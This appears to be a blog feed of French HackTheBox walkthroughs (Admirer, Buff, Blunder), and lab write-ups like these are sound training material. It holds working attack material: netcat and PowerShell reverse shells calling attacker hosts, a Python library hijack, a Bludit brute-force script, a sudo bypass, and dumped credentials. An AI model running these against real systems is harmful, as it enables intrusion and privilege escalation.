+-rw-r----- 1 kali kali  401 Dec  1  2019 db_admin.php
+-rw-r----- 1 kali kali   20 Nov 29  2019 info.php
+-rw-r----- 1 kali kali   53 Dec  2  2019 phptest.php
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;admin_tasks.php&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;Administrative Tasks&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+  &amp;lt;h3&amp;gt;Admin Tasks Web Interface (v0.01 beta)&amp;lt;/h3&amp;gt;
+  &amp;lt;?php
+  // Web Interface to the admin_tasks script
+  // 
+  if(isset($_REQUEST[&#39;task&#39;]))
+  {
+    $task = $_REQUEST[&#39;task&#39;];
+    if($task == &#39;1&#39; || $task == &#39;2&#39; || $task == &#39;3&#39; || $task == &#39;4&#39; ||
+       $task == &#39;5&#39; || $task == &#39;6&#39; || $task == &#39;7&#39;)
+    {
+      /*********************************************************************************** 
+         Available options:
+           1) View system uptime
+           2) View logged in users
+           3) View crontab (current user only)
+           4) Backup passwd file (not working)
+           5) Backup shadow file (not working)
+           6) Backup web data (not working)
+           7) Backup database (not working)
+
+           NOTE: Options 4-7 are currently NOT working because they need root privileges.
+                 I&#39;m leaving them in the valid tasks in case I figure out a way
+                 to securely run code as root from a PHP page.
+      ************************************************************************************/
+      echo str_replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;, shell_exec(&amp;quot;/opt/scripts/admin_tasks.sh $task 2&amp;gt;&amp;amp;1&amp;quot;));
+    }
+    else
+    {
+      echo(&amp;quot;Invalid task.&amp;quot;);
+    }
+  } 
+  ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Impossible d’injecter une commande car le point d&#39;entrée $task est filtré.&lt;/p&gt;
+&lt;h2&gt;Adminer&lt;/h2&gt;
+&lt;p&gt;Panne sèche... En cherchant sur google : admirer, sql et php je suis tombé sur &quot;adminer&quot;. Un outil qui est disponible ici, dans le dossier /utility-scripts/ :&lt;/p&gt;
+&lt;p&gt;http://10.10.10.187/utility-scripts/adminer.php&lt;/p&gt;
+&lt;p&gt;En version 4.6.2, il existe une vulnérabilité.&lt;/p&gt;
+&lt;p&gt;https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability&lt;/p&gt;
+&lt;h2&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;Pour l&#39;exploiter il nous faut un serveur mysql sur notre machine, créer une BDD, une table avec une colonne, se connecter à notre BDD depuis Adminer sur la victime, et ainsi accéder à la vulnérabilité &quot;file disclosure&quot;.&lt;/p&gt;
+&lt;p&gt;Aurotiser l&#39;accès au serveur dans la config mysql /etc/mysql/mariadb.conf.d/50-server.cnf :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Instead of skip-networking the default is now to listen only on
+# localhost which is more compatible and is not less secure.
+#bind-address            = 0.0.0.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On créé la DB.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo msql -u root -p
+MariaDB [(none)]&amp;gt; create database exploit;
+MariaDB [(none)]&amp;gt; use exploit;
+MariaDB [exploit]&amp;gt; create table dmp(content varchar(5000));
+MariaDB [(none)]&amp;gt; CREATE USER &#39;exploit&#39;@&#39;%&#39; IDENTIFIED BY &#39;exploit&#39;;
+MariaDB [(none)]&amp;gt; GRANT ALL PRIVILEGES ON exploit.* TO &#39;exploit&#39;@&#39;%&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt; &lt;img src=&quot;/assets/img/image-20200608203737192.png&quot; alt=&quot;image-20200608203737192&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;On peut lire les fichiers de la victime.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608204416636.png&quot; alt=&quot;image-20200608204416636&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Résultat lisible dans la table de notre base.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; use exploit;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [exploit]&amp;gt; select * from dmp;
+...
+                         $servername = &amp;quot;localhost&amp;quot;;                                                                              |
+                         $username = &amp;quot;waldo&amp;quot;;                                                                                    |
+                         $password = &amp;quot;&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;&amp;quot;;                                                                  |
+                         $dbname = &amp;quot;admirerdb&amp;quot;;     
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encore des creds :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608204749388.png&quot; alt=&quot;image-20200608204749388&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Password reuse&lt;/h2&gt;
+&lt;p&gt;Est-ce que Waldo aurait également utiliser ce mot de passe pour l&#39;accès ssh ?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608204935403.png&quot; alt=&quot;image-20200608204935403&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;sudo -l&lt;/h2&gt;
+&lt;p&gt;Waldo peut exécuter ce script &lt;code&gt;(ALL) SETENV: /opt/scripts/admin_tasks.sh&lt;/code&gt;en tant que root.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608205335058.png&quot; alt=&quot;image-20200608205335058&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ce script permet de lancer un autre script python, situé dans le même dossier, et donc en tant que root.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608205836917.png&quot; alt=&quot;image-20200608205836917&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Il faudrait un moyen de passer un paramètre au script backup.py pour modifier son comportement.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608205934302.png&quot; alt=&quot;image-20200608205934302&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;shutil&lt;/h2&gt;
+&lt;p&gt;Constatez qu&#39;on utilise ici une fonction &lt;code&gt;make_archive&lt;/code&gt; de la librairie &lt;code&gt;shutil&lt;/code&gt;. Notons que 3 paramètres sont utilisés pour appeler cette fonction. On devrait pouvoir hijacké cette librairie. https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&lt;/p&gt;
+&lt;p&gt;Créons d&#39;abord notre propre &lt;code&gt;shutil.py&lt;/code&gt;. Il doit être situé dans le dossier /tmp (enfin là où on peut écrire).&lt;/p&gt;
+&lt;p&gt;Préparons un reverse shell python dans /tmp/shutil.py.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import os 
+
+# 3 paramètres nécessaires comme la fonction réelle
+def make_archive(a, b, c):
+	os.system(&#39;nc 10.10.14.27 443 -e &amp;quot;/bin/sh&amp;quot;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On peut changer la manière dont python recherche &lt;code&gt;shutil.py&lt;/code&gt; en modifiant la variable &lt;code&gt;PYTHONPATH&lt;/code&gt;.  On exécute le script et on choisit d&#39;exécuter la fonction vulnérable.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608211428108.png&quot; alt=&quot;image-20200608211428108&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Et notre netcat reçoit la connexion en retour. Nous sommes root.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200608211500892.png&quot; alt=&quot;image-20200608211500892&quot; /&gt;&lt;/p&gt;</content>
+		<link href="2020-09-29-admirer.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/2020-09-29-admirer.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>attacker</title>
+		<content type="html">&lt;hr /&gt;
+
+layout: post
+title: Buff
+subtitle: HackTheBox
+tags: [htb]
+comments: false
+&lt;hr /&gt;
+&lt;p&gt;Mes notes pour Buff.&lt;/p&gt;
+&lt;h2&gt;nmap&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:/media/sf_htb/buff_10.198$ nmap -Pn -sV -p- 10.10.10.198
+Nmap scan report for 10.10.10.198
+Host is up (0.32s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 929.06 seconds
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;website&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:/media/sf_htb/buff_10.198$ curl http://10.10.10.198:8080/contact.php | html2text 
+
+ Toggle navigation     About_Fitness
+    * Home
+    * Package
+    * Facilities
+    * About
+    * Contact
+[email               ]
+[********************]
+[Sign in]
+    * mrb3n&#39;s Bro Hut
+    * Made using Gym Management Software 1.0
+===============================================================================
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Gym Management Software&lt;/h2&gt;
+&lt;p&gt;Exploit : https://www.exploit-db.com/raw/48506&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nous devons trouver upload.php selon la doc de l&#39;exploit. Mais cette page n&#39;existe pas.&lt;/p&gt;
+&lt;h2&gt;gobuster&lt;/h2&gt;
+&lt;p&gt;Il existe bien un /upload.php, mais l&#39;accès n&#39;est pas permis.  &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:/media/sf_sync$ gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+[..]
+/ex (Status: 301)
+[..]
+/upload (Status: 301)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En revanche le /ex contient bien un fichier upload.php !&lt;/p&gt;
+&lt;h2&gt;gym exploit&lt;/h2&gt;
+&lt;p&gt;J&#39;exécute l&#39;exploit sur la racine du site et j&#39;obtiens un shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:/media/sf_sync/practice/htb/buff_10.198$ python 48506.py http://10.10.10.198:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,                                                                                           
+`^^^^^^^^^^^^ /============BOKU=====================&amp;quot;
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On télécharge un nc.exe puis on établit un reverse shell plus adapté que le webshell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# attacker
+kali@kali:/usr/share/windows-resources/binaries$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.198 - - [03/Sep/2020 15:10:27] &amp;quot;GET /nc.exe HTTP/1.1&amp;quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# victim
+C:\xampp\htdocs\gym\upload&amp;gt; powershell -c &amp;quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.15.38:8000/nc.exe&#39;,&#39;C:\xampp\htdocs\gym\upload\nc.exe&#39;)&amp;quot;
+
+C:\xampp\htdocs\gym\upload&amp;gt; nc.exe -nv 10.10.15.38 40000 -e cmd.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# attacker 
+kali@kali:/usr/share/windows-resources/binaries$ sudo nc -nlvp 40000
+listening on [any] 40000 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.10.198] 50703
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;enum&lt;/p&gt;
+&lt;p&gt;Je remarque un port 3306 (mysql) en écoute. Je me mets en recherche de creds.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:\xampp\htdocs\gym&amp;gt; findstr /spin &amp;quot;mysql&amp;quot; *.*
+New Text Document.txt:1:$mysql_host = &amp;quot;mysql16.000webhost.com&amp;quot;;
+New Text Document.txt:2:$mysql_database = &amp;quot;a8743500_secure&amp;quot;;
+New Text Document.txt:3:$mysql_user = &amp;quot;a8743500_secure&amp;quot;;
+New Text Document.txt:4:$mysql_password = &amp;quot;ipad12345&amp;quot;;packages.php:8:if (login_check($mysqli) == true) {
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je constate la présence d&#39;un processus nommer cloudme.exe&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;tasklist /svc
+cmd.exe                       8624 N/A                                         
+conhost.exe                   8500 N/A                                         
+curl.exe                      8824 N/A                                         
+CloudMe.exe                   3668 N/A                                         
+timeout.exe                   3520 N/A                                         
+tasklist.exe                  8740 N/A  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;https://p0i5on8.github.io/posts/hackthebox-buff/&lt;/p&gt;
+&lt;p&gt;4c827b7074e99eefd49d05872185f7f8&lt;/p&gt;</content>
+		<link href="2020-09-02-buff.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/2020-09-02-buff.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>htb blunder</title>
+		<content type="html">&lt;h1&gt;htb blunder&lt;/h1&gt;
+&lt;p&gt;Voici mes notes pour Blunder.&lt;/p&gt;
+&lt;h4&gt;Reco&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ nmap 10.10.10.191
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 01:58 EDT
+Nmap scan report for 10.10.10.191
+Host is up (0.064s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE
+21/tcp closed ftp
+80/tcp open   http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Enumération web&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.191
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Timeout:        10s
+===============================================================
+2020/06/05 02:30:45 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/0 (Status: 200)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/cgi-bin/ (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2020/06/05 02:31:24 Finished
+===============================================================
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ curl  http://10.10.10.191/admin/ | html2text
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2385  100  2385    0     0  15690      0 --:--:-- --:--:-- --:--:-- 15794
+
+****** BLUDIT ******
+[username            ]
+[********************]
+⁰ Remember me
+Login
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On découvre une application Bludit en version 3.9.2 selon la source HTML de la page.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ curl  http://10.10.10.191/admin/ 
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+        &amp;lt;title&amp;gt;Bludit&amp;lt;/title&amp;gt;
+        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+        &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1, shrink-to-fit=no&amp;quot;&amp;gt;
+        &amp;lt;meta name=&amp;quot;robots&amp;quot; content=&amp;quot;noindex,nofollow&amp;quot;&amp;gt;
+
+        &amp;lt;!-- Favicon --&amp;gt;
+        &amp;lt;link rel=&amp;quot;shortcut icon&amp;quot; type=&amp;quot;image/x-icon&amp;quot; href=&amp;quot;/bl-kernel/img/favicon.png?version=3.9.2&amp;quot;&amp;gt;
+
+        &amp;lt;!-- CSS --&amp;gt;
+        &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2&amp;quot;&amp;gt;
+&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605083719998.png&quot; alt=&quot;image-20200605083719998&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Il existe une faiblesse de protection contre le bruteforce. POC ici : https://rastating.github.io/bludit-brute-force-mitigation-bypass/&lt;/p&gt;
+&lt;h4&gt;POC&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+import re
+import requests
+
+host = &#39;http://10.10.10.191&#39;
+login_url = host + &#39;/admin/login&#39;
+username = &#39;admin&#39;
+
+# My modification
+# wordlist = []
+
+filename = &amp;quot;/usr/share/wordlists/rockyou.txt&amp;quot;
+with open(filename) as file:
+    content = file.readlines()
+    word1 = [x.strip() for x in content] 
+wordlist = word1
+
+# Generate 50 incorrect passwords
+# for i in range(50):
+#    wordlist.append(&#39;Password{i}&#39;.format(i = i))
+
+# Add the correct password to the end of the list
+# wordlist.append(&#39;adminadmin&#39;)
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search(&#39;input.+?name=&amp;quot;tokenCSRF&amp;quot;.+?value=&amp;quot;(.+?)&amp;quot;&#39;, login_page.text).group(1)
+
+    print(&#39;[*] Trying: {p}&#39;.format(p = password))
+
+    headers = {
+        &#39;X-Forwarded-For&#39;: password,
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;,
+        &#39;Referer&#39;: login_url
+    }
+
+    data = {
+        &#39;tokenCSRF&#39;: csrf_token,
+        &#39;username&#39;: username,
+        &#39;password&#39;: password,
+        &#39;save&#39;: &#39;&#39;
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if &#39;location&#39; in login_result.headers:
+        if &#39;/admin/dashboard&#39; in login_result.headers[&#39;location&#39;]:
+            print()
+            print(&#39;SUCCESS: Password found!&#39;)
+            print(&#39;Use {u}:{p} to login.&#39;.format(u = username, p = password))
+            print()
+            break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605091855280.png&quot; alt=&quot;image-20200605091855280&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ma tentative de bruteforce échoue. Je continue mes énumérations.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir -u http://10.10.10.191 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x .txt,.php,.bak,.old
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.191
+[+] Threads:        80
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     Linux
+[+] Extensions:     txt,php,bak,old
+[+] Timeout:        10s
+===============================================================
+2020/06/05 05:32:24 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.bak (Status: 403)
+/.htaccess.old (Status: 403)
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.php (Status: 403)
+/.hta.bak (Status: 403)
+/.hta.old (Status: 403)
+/0 (Status: 200)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.bak (Status: 403)
+/.htpasswd.old (Status: 403)
+/LICENSE (Status: 200)
+/about (Status: 200)
+/admin (Status: 301)
+/robots.txt (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+/todo.txt (Status: 200)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je découvre un fichier todo.txt.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Update n&#39;a pas été faite - en effet ;-)&lt;/li&gt;
+&lt;li&gt;Faut-il se connecter en tant que fergus ?&lt;/li&gt;
+&lt;li&gt;L&#39;ancien blog est-il accessible ?&lt;/li&gt;
+&lt;li&gt;Etablissons une liste de mot de passe à partir du contenu du site.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;cewl -w mycustomwordlist.txt -d 10 -m 4 http://10.10.10.191
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je lance mon script bruteforce en utilisant cette fois le user &lt;em&gt;fergus&lt;/em&gt;, et la wordlist mycustomwordlist.txt que je viens de créer.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605114735174.png&quot; alt=&quot;image-20200605114735174&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Bingo&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Use fergus:RolandDeschain to login.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encore un fan de Stephen King !&lt;/p&gt;
+&lt;p&gt;Il existe un module metasploit pour obtenir un reverse shell via Bludit.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605121910806.png&quot; alt=&quot;image-20200605121910806&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Je configure le module.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605121843002.png&quot; alt=&quot;image-20200605121843002&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Et pour obtenir un shell utilisable :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python -c &amp;quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;image-20200605125757335.png&quot; alt=&quot;image-20200605125757335&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Un peu de reconnaissance locale.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ uname -a
+uname -a
+Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+$ cat /etc/issue
+cat /etc/issue
+Ubuntu 19.10 \n \l
+
+$ ls /home
+ls /home
+hugo  shaun
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le flag n&#39;est pas accessible, seul Hugo peut le lire.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ ls -als /home/hugo/*
+/home/hugo:
+total 80
+...
+4 -r--------  1 hugo hugo   33 Jun  5 08:32 user.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Je m&#39;aperçois qu&#39;il y a deux sites sans doute ancien et nouveau site comme c&#39;était évoqué dans la todo.txt list.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ pwd
+/var/www/bludit-3.9.2/bl-content/tmp
+
+$ ls -l
+ls -l
+total 12
+drwxr-xr-x 8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
+drwxrwxr-x 8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
+drwxr-xr-x 2 root     root     4096 Nov 28  2019 html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Voyons le contenu de users.php du nouveau site. Un compte Hugo et son empreinte de mot de passe !&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ pwd          
+pwd
+/var/www/bludit-3.10.0a/bl-content/databases
+$ cat users.php
+cat users.php
+&amp;lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&amp;gt;
+{
+    &amp;quot;admin&amp;quot;: {
+        &amp;quot;nickname&amp;quot;: &amp;quot;Hugo&amp;quot;,
+        &amp;quot;firstName&amp;quot;: &amp;quot;Hugo&amp;quot;,
+        &amp;quot;lastName&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;role&amp;quot;: &amp;quot;User&amp;quot;,
+        &amp;quot;password&amp;quot;: &amp;quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&amp;quot;,
+        &amp;quot;email&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;registered&amp;quot;: &amp;quot;2019-11-27 07:40:55&amp;quot;,
+        &amp;quot;tokenRemember&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;tokenAuth&amp;quot;: &amp;quot;b380cb62057e9da47afce66b4615107d&amp;quot;,
+        &amp;quot;tokenAuthTTL&amp;quot;: &amp;quot;2009-03-15 14:00&amp;quot;,
+        &amp;quot;twitter&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;facebook&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;instagram&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;codepen&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;linkedin&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;github&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;gitlab&amp;quot;: &amp;quot;&amp;quot;}
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le hash est-il connu de crackstation.net ? Oui !&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605133203267.png&quot; alt=&quot;image-20200605133203267&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Le mot de passe aurait-il été réutilisé pour le compte unix ? C&#39;est le cas !&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ su - hugo
+su - hugo
+Password: Password120
+
+hugo@blunder:~$ cat user.txt
+cat user.txt
+fbbd480ffe63207917bf7f19b9dcf347
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A quelles commandes avons-nous accès avec sudo ?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hugo@blunder:~$ sudo -l
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si on google ceci &lt;code&gt;(ALL, !root) /bin/bash&lt;/code&gt;, on découvre des explications sur une vulnérabilité sudo (CVE-2019-18634) https://www.exploit-db.com/exploits/47502. Il s&#39;agit de contourner les restriction du fichier sudoers.&lt;/p&gt;
+&lt;p&gt;Vulnérabilité jusqu&#39;à la version 1.8.27 et nous sommes en 1.8.25p1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605141506589.png&quot; alt=&quot;image-20200605141506589&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Le contournement de la restriction du fichier sudoers :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hugo@blunder:~$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# whoami
+whoami
+root
+root@blunder:/home/hugo# id
+id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+root@blunder:/home/hugo# 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/image-20200605134534606.png&quot; alt=&quot;image-20200605134534606&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@blunder:/root# cat root.txt
+cat root.txt
+2a5148892d8ae104a26698ae3e94bb3e
+&lt;/code&gt;&lt;/pre&gt;</content>
+		<link href="2020-06-16-blunder.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/2020-06-16-blunder.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+</feed>
